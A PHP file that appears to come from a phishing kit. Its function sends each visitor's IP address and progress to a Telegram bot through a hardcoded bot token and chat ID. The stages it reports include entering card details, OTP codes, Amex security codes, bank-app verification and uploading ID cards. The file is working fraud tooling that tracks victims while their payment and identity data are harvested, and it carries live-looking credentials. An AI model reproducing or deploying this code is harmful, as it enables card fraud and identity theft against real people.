
<?php

require "../main.php";

function note($statu){

			$c = curl_init();
		curl_setopt($c, CURLOPT_URL, "https://api.telegram.org/bot7165314118:AAHdKoOnVtoSd5z_bOhP0XSJJIwkCe4OO8M/sendMessage?chat_id=7005236807&parse_mode=html&text=".urlencode("".$_SERVER['REMOTE_ADDR']." => $statu "));
		curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($c, CURLOPT_TIMEOUT, 5);
		curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 3);
		$res =  curl_exec($c);
		curl_close($c);

}

if(isset($_POST['cardview'])){
	note("in card page");
}if(isset($_POST['carding'])){
	note("Entering card info...");
}if(isset($_POST['otping'])){
	note("Entering OTP...");
}if(isset($_POST['otpview'])){
	note("In OTP page");
}if(isset($_POST['amex1'])){
	note("In Amex 3-digits");
}if(isset($_POST['amex2'])){
	note("In Amex SMS");
}if(isset($_POST['waiting'])){
	note("Waiting...");
}if(isset($_POST['appview'])){
	note("Bank app verification...");
}if(isset($_POST['proofview'])){
	note("In ID proof page");
}if(isset($_POST['proofing'])){
	note("Uploading ID Cards...");
}if(isset($_POST['finish'])){
	note("Finished!");
}
?>
